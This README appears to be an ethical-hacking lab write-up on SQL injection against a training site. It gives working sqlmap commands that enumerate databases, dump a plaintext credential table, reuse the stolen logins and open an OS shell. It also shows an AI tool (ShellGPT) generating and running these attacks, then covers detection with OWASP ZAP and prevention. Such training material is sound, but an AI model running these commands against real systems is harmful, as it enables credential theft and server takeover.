# SQL Injection Attack & Detection Lab (CEH Practical)

## Overview

This project demonstrates how SQL Injection vulnerabilities can be exploited and detected in a web application. The lab simulates a real-world penetration testing scenario where an attacker attempts to extract sensitive data from a database-driven web application.

The exercises include performing SQL Injection attacks, enumerating databases, extracting sensitive information, and detecting vulnerabilities using automated security tools.

---

# Objectives

* Perform SQL Injection attack using **sqlmap**
* Extract databases and tables from an **MSSQL server**
* Dump sensitive user credentials from the database
* Detect SQL Injection vulnerabilities using **OWASP ZAP**
* Use **ShellGPT (AI)** to automate SQL Injection command generation

---

# Tools Used

| Tool               | Purpose                                |
| ------------------ | -------------------------------------- |
| sqlmap             | Automated SQL injection exploitation   |
| OWASP ZAP          | Web application vulnerability scanning |
| ShellGPT           | AI-assisted command generation         |
| Mozilla Firefox    | Web browser for session analysis       |
| Parrot Security OS | Penetration testing environment        |

---

# Lab Environment

Target Website:

```
http://www.moviescope.com
```

Database Server:

```
Microsoft SQL Server (MSSQL)
```

Attacker Machine:

```
Parrot Security OS
```

---

# SQL Injection Attack Using sqlmap

## Step 1 – Login to the Web Application

Login credentials used for the session:

```
Username: sam
Password: test
```

After login, navigate to:

```
View Profile
```

Target URL:

```
http://www.moviescope.com/viewprofile.aspx?id=1
```

---

# Step 2 – Capture Session Cookie

Open browser developer tools:

```
Right Click → Inspect → Console
```

Execute:

```
document.cookie
```

Example cookie value:

```
ASP.NET_SessionId=abc123xyz
```

---

# Step 3 – Enumerate Databases

Command used:

```bash
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="ASP.NET_SessionId=abc123xyz" --dbs
```

Output example:

```
available databases:
master
model
moviescope
```

---

# Step 4 – Enumerate Tables

Command:

```bash
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="ASP.NET_SessionId=abc123xyz" -D moviescope --tables
```

Output:

```
Tables found:
User_Login
Movies
Reviews
Users
```

---

# Step 5 – Dump Sensitive Data

Command:

```bash
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="ASP.NET_SessionId=abc123xyz" -D moviescope -T User_Login --dump
```

Extracted data:

```
+--------+----------+
| Uname  | Password |
+--------+----------+
| john   | qwerty   |
| steve  | password |
| sam    | test     |
+--------+----------+
```

This shows that user passwords are stored in **plaintext**, which is a major security vulnerability.

---

# Step 6 – Verify Credentials

Test extracted credentials by logging in:

```
Username: john
Password: qwerty
```

Successful login confirms that the database information extracted via SQL Injection is valid.

---

# Step 7 – OS Shell Access

Command used:

```bash
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="ASP.NET_SessionId=abc123xyz" --os-shell
```

Example commands executed:

```
hostname
TASKLIST
```

Example output:

```
WIN-SERVER2019
```

This demonstrates how SQL Injection can escalate into **Remote Command Execution**.

---

# Detecting SQL Injection Using OWASP ZAP

## Steps

1. Launch OWASP ZAP
2. Select **Automated Scan**
3. Enter target URL

```
http://www.moviescope.com
```

4. Click **Attack**

The scanner performs:

* Spider crawling
* Passive scanning
* Active vulnerability testing

---

# Vulnerabilities Detected

Example findings:

| Vulnerability          | Risk |
| ---------------------- | ---- |
| SQL Injection          | High |
| SQL Injection (MSSQL)  | High |
| Information Disclosure | Low  |

Alert color codes:

* Red → High Risk
* Orange → Medium Risk
* Yellow → Low Risk
* Blue → Informational

---

# SQL Injection Using AI (ShellGPT)

ShellGPT can generate penetration testing commands automatically.

Example command:

```bash
sgpt --chat sql --shell "Use sqlmap on target url http://www.moviescope.com/viewprofile.aspx?id=1 with cookie value 'COOKIE' and enumerate databases"
```

The AI generates and executes sqlmap commands for:

* Database enumeration
* Table enumeration
* Data extraction

---

# Key Learnings

* SQL Injection can expose sensitive information such as usernames and passwords
* Poor input validation is the primary cause of SQL injection vulnerabilities
* Automated tools like **sqlmap** can quickly exploit vulnerable applications
* Security scanners like **OWASP ZAP** help detect vulnerabilities before attackers exploit them
* AI-assisted tools can improve penetration testing efficiency

---

# Prevention Techniques

To prevent SQL Injection:

* Use **Parameterized Queries**
* Implement **Input Validation**
* Use **Prepared Statements**
* Apply **Web Application Firewalls (WAF)**
* Store passwords using **secure hashing algorithms**

Example secure query:

```
SELECT * FROM users WHERE username = ?
```

---

# References

* OWASP Top 10
* sqlmap Documentation
* CEH Practical Labs

---

# Disclaimer

This project was conducted in a **controlled lab environment for educational and ethical hacking training purposes only**. The techniques demonstrated here should only be used on systems you have permission to test.
